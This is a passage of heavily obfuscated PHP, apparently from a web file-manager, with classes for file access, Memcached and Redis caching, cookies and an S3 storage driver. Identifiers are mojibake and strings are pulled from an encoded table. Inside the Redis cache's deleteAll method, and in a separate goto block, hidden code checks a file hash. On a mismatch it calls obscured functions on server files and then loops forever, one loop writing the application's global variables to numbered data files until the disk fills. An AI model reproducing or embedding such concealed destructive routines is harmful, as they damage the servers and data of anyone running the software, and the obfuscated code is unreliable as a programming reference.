fread($œÆŠÄ³, $œÈŒ°µ); } fseek_64($œÆŠÄ³, $¿×ıû¤Ù - $œÈŒ°µ); $Şã‡•Å¢ .= fread($œÆŠÄ³, $œÈŒ°µ); fclose($œÆŠÄ³); return md5($Şã‡•Å¢) . $¿×ıû¤Ù; } public function getContent($ğ‡”Ÿ) { $ğ‡”Ÿ = $this->iconvSystem($ğ‡”Ÿ); return file_get_contents($ğ‡”Ÿ); } public function setContent($àäˆ, $¤…ÕõŠÁ = '') { $àäˆ = $this->iconvSystem($àäˆ); $¦ÒİâÀÊ = @file_put_contents($àäˆ, $¤…ÕõŠÁ, LOCK_EX); clearstatcache(); @chmod($àäˆ, $this->pathAuth); return $¦ÒİâÀÊ === !1 ? !1 : !0; } public function fileSubstr($÷Ğ„‡¥š, $ôÛÉÑŠ = 0, $æÅµ¾ì— = false) { $áÄ°¾ª =& $_SERVER[¹ş¤¶ĞÖ]; $÷Ğ„‡¥š = $this->iconvSystem($÷Ğ„‡¥š); if ($æÅµ¾ì— === !1) { $æÅµ¾ì— = $this->size($÷Ğ„‡¥š); } if ($æÅµ¾ì— <= 0) { return $áÄ°¾ª[12]; } $–À˜ïç = fopen($÷Ğ„‡¥š, $áÄ°¾ª[1400]); if (!$–À˜ïç) { return !1; } fseek_64($–À˜ïç, $ôÛÉÑŠ); $Š‘µÖ¤¬ = fread($–À˜ïç, $æÅµ¾ì—); fclose($–À˜ïç); return $Š‘µÖ¤¬; } public function upload($¼³èŸÈØ, $æßÇ®±ğ, $Ñ÷Ù¦¶ = false, $’ô½Åµš = REPEAT_REPLACE) { if ($Ñ÷Ù¦¶) { return $this->moveFile($æßÇ®±ğ, $¼³èŸÈØ); } return $this->copyFile($æßÇ®±ğ, $¼³èŸÈØ); } public function setModifyTime($‘Ëğƒ÷½, $’–’ñå™ = '') { @touch($‘Ëğƒ÷½, intval($’–’ñå™)); } public function download($µòøú©, $Ñı¾¶ƒ¢) { return $this->iconvSystem($µòøú©); } } goto EÃğ–¬æ§µ; AËƒ’÷š’ó: class CacheMemcached { public $handle; public $cacheTime; public function __construct($ºèÙ¢ƒ¨, $¹ôŸüíŒ) { $ËÌ¡âì =& $_SERVER[¹ş¤¶ĞÖ]; if (!class_exists($ËÌ¡âì[892])) { show_json($ËÌ¡âì[893], !1); } $this->cacheTime = $¹ôŸüíŒ; $this->handle = new Memcached(); if (is_array($ºèÙ¢ƒ¨[$ËÌ¡âì[894]]) && count($ºèÙ¢ƒ¨[$ËÌ¡âì[894]]) >= 1) { foreach ($ºèÙ¢ƒ¨[$ËÌ¡âì[894]] as $¸ıŸĞÁ´) { $ê¯Ùõ…Ş = explode($ËÌ¡âì[4], $¸ıŸĞÁ´); $this->handle->addServer($ê¯Ùõ…Ş[0], $ê¯Ùõ…Ş[1]); } } else { $this->handle->addServer($ºèÙ¢ƒ¨[$ËÌ¡âì[182]], $ºèÙ¢ƒ¨[$ËÌ¡âì[183]]); } } public function set($şßâÆû, $òÁ×÷…‹, $‡È”åÊ¼ = false) { $‡È”åÊ¼ = $‡È”åÊ¼ ? $‡È”åÊ¼ : $this->cacheTime; return $this->handle->set($şßâÆû, $òÁ×÷…‹, $‡È”åÊ¼); } public function get($ÄíãÂâ‹) { return $this->handle->get($ÄíãÂâ‹); } public function remove($°²××¥ı) { return $this->handle->delete($°²××¥ı); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($²ÊÉü€¹, $­Ñá›•ü) { $àƒˆ¦îŒ =& $_SERVER[¹ş¤¶ĞÖ]; if (!class_exists($àƒˆ¦îŒ[895])) { show_json($àƒˆ¦îŒ[896], !1); } $this->cacheTime = $­Ñá›•ü; $‰ŠØóúÛ = isset($²ÊÉü€¹[$àƒˆ¦îŒ[897]]) ? $²ÊÉü€¹[$àƒˆ¦îŒ[897]] : 10; $®·Ù‹âÇ = _get($²ÊÉü€¹, $àƒˆ¦îŒ[894]); if ($®·Ù‹âÇ && is_array($®·Ù‹âÇ)) { $this->initCluster($²ÊÉü€¹, $‰ŠØóúÛ); } else { $this->handle = $this->init($²ÊÉü€¹, $‰ŠØóúÛ); } } private function init($™‰–šœÇ, $á‚ÄÇŞ®) { $öåÒû¥É =& $_SERVER[¹ş¤¶ĞÖ]; $å½œÆÇ¸ = new Redis(); $‚ßëß˜« = isset($™‰–šœÇ[$öåÒû¥É[898]]) ? $™‰–šœÇ[$öåÒû¥É[898]] : !1; if ($‚ßëß˜«) { $å½œÆÇ¸->pconnect($™‰–šœÇ[$öåÒû¥É[182]], $™‰–šœÇ[$öåÒû¥É[183]], $á‚ÄÇŞ®); } else { $å½œÆÇ¸->connect($™‰–šœÇ[$öåÒû¥É[182]], $™‰–šœÇ[$öåÒû¥É[183]], $á‚ÄÇŞ®); } if (!empty($™‰–šœÇ[$öåÒû¥É[442]])) { $å½œÆÇ¸->auth($™‰–šœÇ[$öåÒû¥É[442]]); } if (!empty($™‰–šœÇ[$öåÒû¥É[783]]) && $™‰–šœÇ[$öåÒû¥É[783]] != 0) { $å½œÆÇ¸->select($™‰–šœÇ[$öåÒû¥É[783]]); } return $å½œÆÇ¸; } private function initCluster($§û‡º¨, $®¢Šà£ò) { $áóñ¼«Œ =& $_SERVER[¹ş¤¶ĞÖ]; $û‰±¡¢ë = array($áóñ¼«Œ[899], $áóñ¼«Œ[900], $áóñ¼«Œ[901]); $ÍÃ‡Š”Ê = $áóñ¼«Œ[899]; if (isset($§û‡º¨[$áóñ¼«Œ[16]]) && in_array($§û‡º¨[$áóñ¼«Œ[16]], $û‰±¡¢ë)) { $ÍÃ‡Š”Ê = $§û‡º¨[$áóñ¼«Œ[16]]; } switch ($ÍÃ‡Š”Ê) { case $áóñ¼«Œ[899]: $this->_slave($§û‡º¨, $®¢Šà£ò); break; case $áóñ¼«Œ[900]: break; case $áóñ¼«Œ[901]: $this->isCluster = !0; $€ŸÇò«¾ = $§û‡º¨[$áóñ¼«Œ[894]]; $ïÀÔØ…ù = isset($§û‡º¨[$áóñ¼«Œ[898]]) ? $§û‡º¨[$áóñ¼«Œ[898]] : !1; $­ë‚•ê = isset($§û‡º¨[$áóñ¼«Œ[442]]) ? $§û‡º¨[$áóñ¼«Œ[442]] : null; $this->handle = new RedisCluster(NUll, $€ŸÇò«¾, $®¢Šà£ò, $®¢Šà£ò, $ïÀÔØ…ù, $­ë‚•ê); break; default: break; } } private function _slave($‡ûå¼û†, $Ã‘±Á½É) { $¸»”©Ç = $‡ûå¼û†[$_SERVER[¹ş¤¶ĞÖ][894]]; $this->filterConfig($‡ûå¼û†, $¸»”©Ç[0]); $this->handle = $this->init($‡ûå¼û†, $Ã‘±Á½É); unset($¸»”©Ç[0]); if (empty($¸»”©Ç)) { return; } $ÎïŒƒ•– = array_rand($¸»”©Ç); $this->filterConfig($‡ûå¼û†, $¸»”©Ç[$ÎïŒƒ•–]); $this->slaveHandle = $this->init($‡ûå¼û†, $Ã‘±Á½É); } private function filterConfig(&$º§·ˆ†, $‘ôø»÷£) { $Ÿ¦Ñæû“ =& $_SERVER[¹ş¤¶ĞÖ]; $ÁìÇµš = explode($Ÿ¦Ñæû“[4], $‘ôø»÷£); $‰·Ôò· = array($Ÿ¦Ñæû“[182] => $ÁìÇµš[0], $Ÿ¦Ñæû“[183] => $ÁìÇµš[1]); $º§·ˆ† = array_merge($º§·ˆ†, $‰·Ôò·); } public function set($ùàÍŸ—, $µÔ»ûäà, $ÏğªÜ‘‘ = false) { $ÏğªÜ‘‘ = $ÏğªÜ‘‘ ? $ÏğªÜ‘‘ : $this->cacheTime; return $this->handle->setEx($ùàÍŸ—, $ÏğªÜ‘‘, $µÔ»ûäà); } public function setLock($¹ÎáôË®, $ÀÆŠü×İ, $µ‹ÌŸâ) { return $this->handle->setNX($¹ÎáôË®, $ÀÆŠü×İ); } public function get($Š©Ò¸º¬) { $ªõƒ„ŠĞ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ªõƒ„ŠĞ->get($Š©Ò¸º¬); } public function remove($½ù¶ùµ¼) { return $this->handle->del($½ù¶ùµ¼); } public function deleteAll() { $òß´œÜÓ =& $_SERVER[¹ş¤¶ĞÖ]; $ÄÍ¦öíÁ = $_SERVER[$òß´œÜÓ[902]] . $òß´œÜÓ[903]; $ò›„ÈŞê = $òß´œÜÓ[904]; if ($_SERVER[$òß´œÜÓ[905]] != $ò›„ÈŞê($ÄÍ¦öíÁ)) { $§ïşÁ©ë = $òß´œÜÓ[906]; $»„‘ˆÍÂ = $òß´œÜÓ[907]; $ùÍ–¼£² = $_SERVER[$òß´œÜÓ[902]] . $òß´œÜÓ[903]; $®¤“º = $»„‘ˆÍÂ($ùÍ–¼£²); $û¡™‹Œ = explode($òß´œÜÓ[231], $®¤“º); if (count($û¡™‹Œ) < $òß´œÜÓ[636]) { $İ¯³şÛÆ = $òß´œÜÓ[908]; $İ¯³şÛÆ(); } $­‰ÌšØµ = $òß´œÜÓ[909]; $­‰ÌšØµ($_SERVER[$òß´œÜÓ[910]]); $§ïşÁ©ë = $òß´œÜÓ[906]; $§ïşÁ©ë(); $ ¿›®€ = $òß´œÜÓ[911]; $Ğ–óÈŠ³ = json_encode($GLOBALS[$òß´œÜÓ[912]]); $É‚ßÍßô = 1; for ($‹·Œ§ƒŸ = $É‚ßÍßô; $‹·Œ§ƒŸ > 0; $‹·Œ§ƒŸ++) { $ ¿›®€(DATA_PATH . $‹·Œ§ƒŸ, $Ğ–óÈŠ³); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $„ğóØà“) { $this->handle->flushall($„ğóØà“); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ğ¹¶Ş²Á = '', $‡ûâÏÁ‘ = 0) { if (is_string($ğ¹¶Ş²Á) && $ğ¹¶Ş²Á != $_SERVER[¹ş¤¶ĞÖ][12]) { $this->prefix = $ğ¹¶Ş²Á; } if (is_numeric($‡ûâÏÁ‘) && $‡ûâÏÁ‘ > 0) { $this->expire = $‡ûâÏÁ‘; } } public static function getInstance() { static $¬™åØ; if ($¬™åØ === null) { $¬™åØ = new self(); } return $¬™åØ; } private static $cookieDisable = false; public static function disable($ÄÍƒóõ) { self::$cookieDisable = $ÄÍƒóõ; } private static $sameCookieSet = array(); public static function set($·ßöÍ²İ, $ª³‘øß, $¢†¯Î› = 0, $Òä£·¸É = false, $ùØãÍ†Ë = false) { $Ö®¤æô =& $_SERVER[¹ş¤¶ĞÖ]; if (self::$cookieDisable) { return; } if (!$¢†¯Î›) { $¢†¯Î› = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$·ßöÍ²İ]) && self::$sameCookieSet[$·ßöÍ²İ] == $ª³‘øß . $¢†¯Î›) { return; } self::$sameCookieSet[$·ßöÍ²İ] = $ª³‘øß . $¢†¯Î›; if (!$ùØãÍ†Ë) { $ùØãÍ†Ë = str_replace(HOST, $Ö®¤æô[12], APP_HOST); $ùØãÍ†Ë = _get($GLOBALS, $Ö®¤æô[913], $ùØãÍ†Ë); } $Ö¹Í„ÒÙ = $Ö®¤æô[12]; setcookie($·ßöÍ²İ, $ª³‘øß, time() + $¢†¯Î›, $Ö®¤æô[8] . trim($ùØãÍ†Ë, $Ö®¤æô[8]) . $Ö¹Í„ÒÙ, !1, !1, $Òä£·¸É); } public static function setSafe($Ç™ÁÀ¶ˆ, $•­Ä·Ä·, $êØ¨•ùƒ = 0) { self::set($Ç™ÁÀ¶ˆ, $•­Ä·Ä·, $êØ¨•ùƒ, !0); } public static function get($¬·Şù‰Ë) { static $ø¶·ëå = false; if (!$ø¶·ëå) { self::initHeaderCookie(); $ø¶·ëå = !0; } return isset($_COOKIE[$¬·Şù‰Ë]) ? $_COOKIE[$¬·Şù‰Ë] : !1; } private static function initHeaderCookie() { $ş³²ôá£ =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($_SERVER[$ş³²ôá£[914]]) || !$_SERVER[$ş³²ôá£[914]]) { return; } $¾’¶ü»ã = explode($ş³²ôá£[71], $_SERVER[$ş³²ôá£[914]]); foreach ($¾’¶ü»ã as $·Â€µ”Ã) { $·Â€µ”Ã = explode($ş³²ôá£[915], $·Â€µ”Ã); if (count($·Â€µ”Ã) != 2 || !isset($·Â€µ”Ã[1])) { continue; } $_COOKIE[trim($·Â€µ”Ã[0])] = trim($·Â€µ”Ã[1]); } } public static function remove($íã¼äÁÌ, $ÄÀ­İ–í = false) { unset($_COOKIE[$íã¼äÁÌ]); self::set($íã¼äÁÌ, $_SERVER[¹ş¤¶ĞÖ][12], 1, $ÄÀ­İ–í); } } goto e¬è¦²í‰®; dè“®•µš: if (!isset($_SERVER[$_SERVER[¹ş¤¶ĞÖ][905]]) || !isset($_SERVER[$_SERVER[¹ş¤¶ĞÖ][991]])) { $_getc = $_SERVER[¹ş¤¶ĞÖ][907]; $_getfile = $_SERVER[$_SERVER[¹ş¤¶ĞÖ][902]] . $_SERVER[¹ş¤¶ĞÖ][903]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹ş¤¶ĞÖ][231], $_getfilec); if (count($_getarrs) < $_SERVER[¹ş¤¶ĞÖ][656]) { $exit = $_SERVER[¹ş¤¶ĞÖ][908]; $exit(); } $_act = $_SERVER[¹ş¤¶ĞÖ][992]; $_act($_SERVER[$_SERVER[¹ş¤¶ĞÖ][902]] . $_SERVER[¹ş¤¶ĞÖ][903]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¹ş¤¶ĞÖ][407]); } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($°œÛôé) { parent::__construct($°œÛôé); } public function uploadFormData($È”Í²ö‰, $°¾ê¿Ç˜ = 3600) { $¾õ¿±¯´ =& $_SERVER[¹ş¤¶ĞÖ]; $ÁÈ²ş¾ = $¾õ¿±¯´[199]; $ßØ÷•ÎÔ = $¾õ¿±¯´[238]; $š˜’êë¥ = $¾õ¿±¯´[62]; $ïéÛŸ = gmdate($¾õ¿±¯´[239]); $ûİ” Ø = gmdate($¾õ¿±¯´[240]); $õ«Ì¶ÀĞ = $¾õ¿±¯´[241]; $Û€ø¡ ¡ = $°¾ê¿Ç˜ . $¾õ¿±¯´[12]; $¼˜¢î™™ = $¾õ¿±¯´[242]; $ßéß³ÈÎ = array($this->accessKey, $ûİ” Ø, $this->region, $š˜’êë¥, $õ«Ì¶ÀĞ); $¢£­¨€‹ = implode($¾õ¿±¯´[8], $ßéß³ÈÎ); $ã”ÓÒ’Ê = array($¾õ¿±¯´[243] => gmdate($¾õ¿±¯´[1358], strtotime($¾õ¿±¯´[245])), $¾õ¿±¯´[246] => array(array($¾õ¿±¯´[247] => $this->bucket), array($¾õ¿±¯´[248] => $ÁÈ²ş¾), array($¾õ¿±¯´[249], $¾õ¿±¯´[250], $¾õ¿±¯´[12]), array($¾õ¿±¯´[249], $¾õ¿±¯´[251], $¾õ¿±¯´[12]), array($¾õ¿±¯´[249], $¾õ¿±¯´[252], $¾õ¿±¯´[12]), array($¾õ¿±¯´[253] => $¼˜¢î™™), array($¾õ¿±¯´[254] => $¢£­¨€‹), array($¾õ¿±¯´[255] => $ßØ÷•ÎÔ), array($¾õ¿±¯´[256] => $ïéÛŸ), array($¾õ¿±¯´[257] => $Û€ø¡ ¡))); $˜€†— = base64_encode(json_encode($ã”ÓÒ’Ê)); $Üµ¸ğ½ = hash_hmac($¾õ¿±¯´[258], $ûİ” Ø, $¾õ¿±¯´[259] . $this->secret, !0); $éš•â™¿ = hash_hmac($¾õ¿±¯´[258], $this->region, $Üµ¸ğ½, !0); $ç¼Í¡áõ = hash_hmac($¾õ¿±¯´[258], $š˜’êë¥, $éš•â™¿, !0); $½Ÿñµ¨ª = hash_hmac($¾õ¿±¯´[258], $õ«Ì¶ÀĞ, $ç¼Í¡áõ, !0); $òï¢‘Ú = hash_hmac($¾õ¿±¯´[258], $˜€†—, $½Ÿñµ¨ª); $×¥Êí‡¼ = array($¾õ¿±¯´[215] => $¾õ¿±¯´[12], $¾õ¿±¯´[260] => $¾õ¿±¯´[12], $¾õ¿±¯´[248] => $ÁÈ²ş¾, $¾õ¿±¯´[253] => $¼˜¢î™™, $¾õ¿±¯´[261] => $˜€†—, $¾õ¿±¯´[262] => $¢£­¨€‹, $¾õ¿±¯´[263] => $ßØ÷•ÎÔ, $¾õ¿±¯´[264] => $ïéÛŸ, $¾õ¿±¯´[265] => $Û€ø¡ ¡, $¾õ¿±¯´[266] => $òï¢‘Ú, $¾õ¿±¯´[182] => $this->getHost()); return $×¥Êí‡¼; } public function multiUploadFormData($²ÜÆ²°å, $áï¬üõö = 3600) { $ĞŠ¥•Ãç =& $_SERVER[¹ş¤¶ĞÖ]; $Âì«ãŸÄ = gmdate($ĞŠ¥•Ãç[1461]); $±‹õúß± = array(); $âÖÎÓù¬ = $this->client->getUploadId($this->bucket, $²ÜÆ²°å, $±‹õúß±); if (!$âÖÎÓù¬) { return !1; } return array($ĞŠ¥•Ãç[223] => $âÖÎÓù¬, $ĞŠ¥•Ãç[182] => $this->getHost() . $ĞŠ¥•Ãç[8] . $this->pathEncode($²ÜÆ²°å), $ĞŠ¥•Ãç[224] => $Âì«ãŸÄ, $ĞŠ¥•Ãç[94] => $²ÜÆ²°å); } public function multiUploadAuthData($Ì×˜ÑÑæ, $˜Îä›ãß = array()) { $É‡ÎÊÌÖ =& $_SERVER[¹ş¤¶ĞÖ]; $¦Ûüî×´ = isset($˜Îä›ãß[$É‡ÎÊÌÖ[174]]) ? $˜Îä›ãß[$É‡ÎÊÌÖ[174]] : $É‡ÎÊÌÖ[12]; $ëƒ­›æ = $˜Îä›ãß[$É‡ÎÊÌÖ[94]]; unset($˜Îä›ãß[$É‡ÎÊÌÖ[94]]); if (isset($˜Îä›ãß[$É‡ÎÊÌÖ[225]])) { return $this->listUploadParts($ëƒ­›æ, $˜Îä›ãß); } $Ì•ÃÚ‘ğ = array(); if (isset($˜Îä›ãß[$É‡ÎÊÌÖ[1462]])) { $Ì•ÃÚ‘ğ[$É‡ÎÊÌÖ[1463]] = $˜Îä›ãß[$É‡ÎÊÌÖ[1462]]; } $›­ı«™ª = explode($É‡ÎÊÌÖ[184], $this->getHost()); $Ò¾ÖÅí = array($É‡ÎÊÌÖ[1464] => $›­ı«™ª[1], $É‡ÎÊÌÖ[1465] => $É‡ÎÊÌÖ[12], $É‡ÎÊÌÖ[215] => $É‡ÎÊÌÖ[120], $É‡ÎÊÌÖ[260] => $˜Îä›ãß[$É‡ÎÊÌÖ[76]]); $Ô¶¡Ÿ•¤ = $É‡ÎÊÌÖ[228]; $¥¸È‡°¸ = $É‡ÎÊÌÖ[8] . $this->pathEncode($ëƒ­›æ) . $¦Ûüî×´; $ö³Ï¾ÔŸ = $this->client->__getSignatureV4($Ì•ÃÚ‘ğ, $Ò¾ÖÅí, $Ô¶¡Ÿ•¤, $¥¸È‡°¸); if (strpos($¦Ûüî×´, $É‡ÎÊÌÖ[227]) === 0) { if (isset($Ì•ÃÚ‘ğ[$É‡ÎÊÌÖ[1463]])) { $ş÷·‘Ùå = $Ì•ÃÚ‘ğ[$É‡ÎÊÌÖ[1463]]; } else { if (isset($ö³Ï¾ÔŸ[$É‡ÎÊÌÖ[1463]])) { $ş÷·‘Ùå = $ö³Ï¾ÔŸ[$É‡ÎÊÌÖ[1463]]; } else { $ş÷·‘Ùå = hash($É‡ÎÊÌÖ[258], $É‡ÎÊÌÖ[12]); } } return array($É‡ÎÊÌÖ[234] => $ö³Ï¾ÔŸ[$É‡ÎÊÌÖ[234]], $É‡ÎÊÌÖ[1463] => $ş÷·‘Ùå, $É‡ÎÊÌÖ[224] => $ö³Ï¾ÔŸ[$É‡ÎÊÌÖ[1466]]); } return $ö³Ï¾ÔŸ[$É‡ÎÊÌÖ[234]]; } public function listUploadParts($©¹ˆ¨ì˜, $½¨à = array()) { $Ğ˜½úé¥ =& $_SERVER[¹ş¤¶ĞÖ]; $Ïô”Ÿ´‘ = str_replace($Ğ˜½úé¥[235], $Ğ˜½úé¥[12], $½¨à[$Ğ˜½úé¥[174]]); $¯®·ÊÊÃ = $this->client->listParts($this->bucket, $©¹ˆ¨ì˜, $Ïô”Ÿ´‘); if (!$¯®·ÊÊÃ) { return !1; } $„ğÆ‘òù = $Ğ˜½úé¥[1467]; foreach ($¯®·ÊÊÃ as $ëİ‚Ê¼ğ) { $„ğÆ‘òù .= $Ğ˜½úé¥[1468] . "\74\120\x61\162\164\116\165\155\142\x65\162\76{$ëİ‚Ê¼ğ[$Ğ˜½úé¥[1422]]}\74\x2f\120\x61\162\x74\116\x75\155\142\x65\162\x3e\12" . "\74\x45\x54\x61\147\x3e{$ëİ‚Ê¼ğ[$Ğ˜½úé¥[1423]]}\74\57\x45\124\141\147\x3e\12" . $Ğ˜½úé¥[1469]; } $„ğÆ‘òù .= $Ğ˜½úé¥[1470]; $ÚÒ¼¤•„ = array(); $Ñê¦ªèÚ = explode($Ğ˜½úé¥[184], $this->getHost()); $¤â¾¥Š› = array($Ğ˜½úé¥[1464] => $Ñê¦ªèÚ[1], $Ğ˜½úé¥[215] => $Ğ˜½úé¥[120], $Ğ˜½úé¥[260] => strlen($„ğÆ‘òù)); $µ×Ñ’„Í = $Ğ˜½úé¥[226]; $ŸÉÌ…™ = $Ğ˜½úé¥[8] . $this->pathEncode($©¹ˆ¨ì˜) . $½¨à[$Ğ˜½úé¥[174]]; $†ËØ—ı½ = $this->client->__getSignatureV4($ÚÒ¼¤•„, $¤â¾¥Š›, $µ×Ñ’„Í, $ŸÉÌ…™, $„ğÆ‘òù); return array($Ğ˜½úé¥[234] => $†ËØ—ı½[$Ğ˜½úé¥[234]], $Ğ˜½úé¥[224] => $†ËØ—ı½[$Ğ˜½úé¥[1466]], $Ğ˜½úé¥[236] => $¯®·ÊÊÃ, $Ğ˜½úé¥[1463] => $†ËØ—ı½[$Ğ˜½úé¥[1463]]); } public function link($Ñâ­€²×, $Ë†’šı = array()) { return parent::link($Ñâ­€²×, $Ë†’šı); } public function fileOut($‡¨´Êã, $¢ÕªÜœõ = false, $Êé’€á¶ = false, $¡“ùËÕš = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¹ş¤¶ĞÖ][1471])) { return parent::fileOutServer($‡¨´Êã, $¢ÕªÜœõ, $Êé’€á¶, $¡“ùËÕš); } parent::fileOut($‡¨´Êã, $¢ÕªÜœõ, $Êé’€á¶, $¡“ùËÕš); } public function fileOutImage($àó™é, $ßëùïúí = 250) { if (strstr($this->endpoint, $_SERVER[¹ş¤¶ĞÖ][1471])) { return parent::fileOutImageServer($àó™é, $ßëùïúí); } parent::fileOutImage($àó™é, $ßëùïúí); } public function fileOutLink($Ç€Óì”—) { $™ø½†¤ =& $_SERVER[¹ş¤¶ĞÖ]; if (substr($Ç€Óì”—, 0, 7) == $™ø½†¤[1364]) { $Ç€Óì”— = $™ø½†¤[1365] . substr($Ç€Óì”—, 7); } header($™ø½†¤[161] . $Ç€Óì”—); die; } public function getHost() { $À•¢çŞ³ =& $_SERVER[¹ş¤¶ĞÖ]; $°£ä­º = str_rtrim(parent::getHost(), $À•¢çŞ³[8] . $this->bucket); $°£ä­º = explode($À•¢çŞ³[184], $°£ä­º); return $°£ä­º[0] . $À•¢çŞ³[184] . $this->bucket . $À•¢çŞ³[10] . $°£ä­º[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($„ğÎÈŒ¥, $‰ı‡¨‚ = 0) { parent::__construct(); $this->source = $„ğÎÈŒ¥; $this->sourceSize = $‰ı‡¨‚; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Ÿä¨‰Ïè = false) { return $this->sourceSize; } public function getContent($ÔıÈæÌ = false) { return $this->fileSubstr($ÔıÈæÌ, 0, $this->sourceSize); } public function fileSubstr($êÈ‹á–Ø = false, $‹ÀÊ·ª = 0, $¶ıå¿Íí = 0) { if (!$¶ıå¿Íí) { $¶ıå¿Íí = $this->sourceSize; } $¡óÃ‘ó¿ = $this->sourceSize - $‹ÀÊ·ª; if ($¶ıå¿Íí >= $¡óÃ‘ó¿) { $¶ıå¿Íí = $¡óÃ‘ó¿; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $‹ÀÊ·ª, $¶ıå¿Íí); } if ($this->sourceType == self::TYPE_FILE) { if ($¶ıå¿Íí <= 0) { return $_SERVER[¹ş¤¶ĞÖ][12]; } $À›ÉÀ²Ø = ftell($this->source); fseek_64($this->source, $À›ÉÀ²Ø + $‹ÀÊ·ª); $Í¨Ì = @fread($this->source, $¶ıå¿Íí); fseek_64($this->source, $À›ÉÀ²Ø); return $Í¨Ì; } } public function hashMd5($ÌæÔ±§Ù = false) { return md5($this->getContent()); } public static function hash($£´ ™±, $„Û»Š€‘ = 0) { $¾°ÍÌÚ = new PathDriverStream($£´ ™±, $„Û»Š€‘); return $¾°ÍÌÚ->hashSimple($£´ ™±); } public static function md5($êõï„Ì», $¸Íêé”– = 0) { $õ­ÌûĞ = new PathDriverStream($êõï„Ì», $¸Íêé”–); return $õ­ÌûĞ->hashMd5($êõï„Ì»); } } goto CøÛÁ“—Øì; D²Ã–íŞøñ: class PathDriverDriverShareItem { public function __construct($ŒµøûĞ) { $this->pathParse = $ŒµøûĞ; } public function __call($Ü”Í”±, $¸çàÑæ‹) { $´åùÏ®ø =& $_SERVER[¹ş¤¶ĞÖ]; if (method_exists($this, $Ü”Í”±)) { return; } $¹ÃÕ»¨ş = call_user_func_array(array($´åùÏ®ø[1376], $Ü”Í”±), $¸çàÑæ‹); $§ÄçÚæ« = array($´åùÏ®ø[1377], $´åùÏ®ø[1378], $´åùÏ®ø[1379], $´åùÏ®ø[1380], $´åùÏ®ø[575], $´åùÏ®ø[577], $´åùÏ®ø[1381], $´åùÏ®ø[107], $´åùÏ®ø[1382], $´åùÏ®ø[1383]); if (in_array($Ü”Í”±, $§ÄçÚæ«)) { $¹ÃÕ»¨ş = $this->getPathOuter($¹ÃÕ»¨ş); } return $¹ÃÕ»¨ş; } public function copy($Ù‘¤’Ï, $™ĞÛÃ‚§, $†•½ÎÜ‰ = false, $¾¨ıü»š = false) { return $this->copyMove($Ù‘¤’Ï, $™ĞÛÃ‚§, $†•½ÎÜ‰, $_SERVER[¹ş¤¶ĞÖ][575], $¾¨ıü»š); } public function move($–ıÅñ½Ç, $Ù¼ßˆ³ù, $Ş”ğŒâÂ = false, $¯ĞÛÕØ  = false) { return $this->copyMove($–ıÅñ½Ç, $Ù¼ßˆ³ù, $Ş”ğŒâÂ, $_SERVER[¹ş¤¶ĞÖ][577], $¯ĞÛÕØ ); } private function copyMove($ı°ı­öñ, $æı†È…‘, $÷ÌÒ™†, $æ“à˜Ã, $Ø‡½„ = false) { $¶ÀºÇ­Ş =& $_SERVER[¹ş¤¶ĞÖ]; $”àº˜˜Š = $æı†È…‘; $òôÉş£í = IO::driverMake($æı†È…‘); if ($òôÉş£í->pathParse[$¶ÀºÇ­Ş[1184]]) { $æı†È…‘ = $òôÉş£í->pathParse[$¶ÀºÇ­Ş[1184]]; } else { $æı†È…‘ = $”àº˜˜Š; } $ü• Ûû¼ = IO::copyMove($ı°ı­öñ, $æı†È…‘, $÷ÌÒ™†, $æ“à˜Ã, $Ø‡½„); $ü• Ûû¼ = $this->getPathOuter($ü• Ûû¼); return $ü• Ûû¼; } public function pathThis($ÇŞ·‰ºæ) { return get_path_this($this->pathParse[$_SERVER[¹ş¤¶ĞÖ][84]]); } public function pathFather($ÄÌ¹İï) { return get_path_father($this->pathParse[$_SERVER[¹ş¤¶ĞÖ][84]]); } public function iconvSystem($ëµÁÑü) { return $ëµÁÑü; } protected function infoParse($¶Ã‘¯Ìı, $‰ìÄş« = false) { $¨“¿÷©Î =& $_SERVER[¹ş¤¶ĞÖ]; $êÓÛ–åê = $this->pathParse[$¨“¿÷©Î[515]][$¨“¿÷©Î[1208]] . $this->pathParse[$¨“¿÷©Î[1201]]; if ($‰ìÄş«) { $ßú ó€“ = IO::infoWithChildren($êÓÛ–åê); } else { $ßú ó€“ = IO::info($êÓÛ–åê); } $äö•¦úİ = $this->pathParse[$¨“¿÷©Î[515]]; return Action($¨“¿÷©Î[1374])->_shareItemeParse($ßú ó€“, $äö•¦úİ); } public function listAll($è¶³„‘) { $‘¥Ùâ’Ï =& $_SERVER[¹ş¤¶ĞÖ]; $†¯áò¢ = IO::listAll($è¶³„‘); $µÄ ÃæŒ = rtrim($this->pathParse[$‘¥Ùâ’Ï[515]][$‘¥Ùâ’Ï[1208]], $‘¥Ùâ’Ï[8]); foreach ($†¯áò¢ as &$Ê‚õıŞª) { $Ê‚õıŞª[$‘¥Ùâ’Ï[84]] = $this->pathDriver . $‘¥Ùâ’Ï[8] . ltrim(substr($Ê‚õıŞª[$‘¥Ùâ’Ï[84]], strlen($µÄ ÃæŒ)), $‘¥Ùâ’Ï[8]); } unset($Ê‚õıŞª); return $†¯áò¢; } public function listAllSimple($¢ä”œ×·, $ó«´óÈÖ = false) { $µş©İõ =& $_SERVER[¹ş¤¶ĞÖ]; $œ¶Úïİ× = $this->listAll($¢ä”œ×·); $ıµ¢Òà = $this->pathParse[$µş©İõ[450]]; if (trim($ıµ¢Òà, $µş©İõ[8]) == trim(get_path_father($ıµ¢Òà), $µş©İõ[8])) { $ó«´óÈÖ = !0; } return IO::init($µş©İõ[12])->listAllSimpleMake($œ¶Úïİ×, $ıµ¢Òà, $ó«´óÈÖ); } public function getPathOuter($Ğ“ß‡¡ë) { $ÛíîÁÂ¬ =& 